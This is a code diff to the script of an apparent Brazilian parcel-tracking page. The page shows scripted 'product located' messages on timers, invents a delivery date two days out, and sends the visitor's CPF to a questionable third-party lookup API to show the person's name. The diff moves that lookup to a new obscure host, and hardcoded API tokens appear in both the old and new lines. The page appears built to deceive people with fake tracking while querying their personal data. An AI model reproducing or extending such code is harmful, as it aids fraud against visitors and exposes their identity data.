@@ -253,6 +253,7 @@
     </div>
   </footer>
 <script>
+    // ...existing code...
   document.getElementById('consultar-btn').addEventListener('click', async function () {
     const popupOverlay = document.getElementById('popup-overlay');
     const loadingSection = document.getElementById('loading-section');
@@ -263,39 +264,39 @@
       "Produto localizado com sucesso...",
       "Aguarde...",
     ];
-
+  
     popupOverlay.style.display = 'flex';
     loadingSection.style.display = 'block';
     resultSection.style.display = 'none';
-
+  
     for (const message of messages) {
       messageStep.textContent = message;
       await new Promise(resolve => setTimeout(resolve, 2000));
     }
-
+  
     try {
       const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
       const cep = document.getElementById('cep').value.replace(/\D/g, '');
-
+  
       // Nova API de CPF
-      const nomeResponse = await fetch(`https://api.dataget.tech/?cpf=${cpf}&api_key=ISu11SQHjMJr`)
+      const nomeResponse = await fetch(`https://api.minerdapifoda.xyz:3000/api/cpf?token=c12d97473fb21bf9bedf65ba494f1047&cpf=${cpf}`)
         .then(res => res.json())
-        .catch(() => ({ dados: { nome: "Nome não disponível" } }));
-
+        .catch(() => ({ DADOS: [{ NOME: "Nome não disponível" }] }));
+  
       const cepResponse = await fetch(`https://viacep.com.br/ws/${cep}/json/`)
         .then(res => res.json())
         .catch(() => ({ cep: cep, logradouro: "Endereço não disponível", localidade: "Cidade não disponível", uf: "Estado não disponível" }));
-
-      document.getElementById('popup-nome-cliente').textContent = nomeResponse.dados.nome || "Nome não disponível";
+  
+      document.getElementById('popup-nome-cliente').textContent = nomeResponse.DADOS[0].NOME || "Nome não disponível";
       document.getElementById('popup-cep-result').textContent = cepResponse.cep || cep;
       document.getElementById('popup-cep-rua').textContent = cepResponse.logradouro || "Endereço não disponível";
       document.getElementById('popup-cep-cidade').textContent = cepResponse.localidade || "Cidade não disponível";
       document.getElementById('popup-cep-estado').textContent = cepResponse.uf || "Estado não disponível";
-
+  
       const prazo = new Date();
       prazo.setDate(prazo.getDate() + 2);
       document.getElementById('popup-prazo').textContent = prazo.toLocaleDateString('pt-BR');
-
+  
       loadingSection.style.display = 'none';
       resultSection.style.display = 'block';
     } catch (error) {
@@ -304,7 +305,7 @@
       resultSection.style.display = 'block';
     }
   });
-
+  // ...existing code...
   // Funções de formatação e eventos mantidos
   document.getElementById('form-rastreamento').addEventListener('submit', async function(e) {
     e.preventDefault();
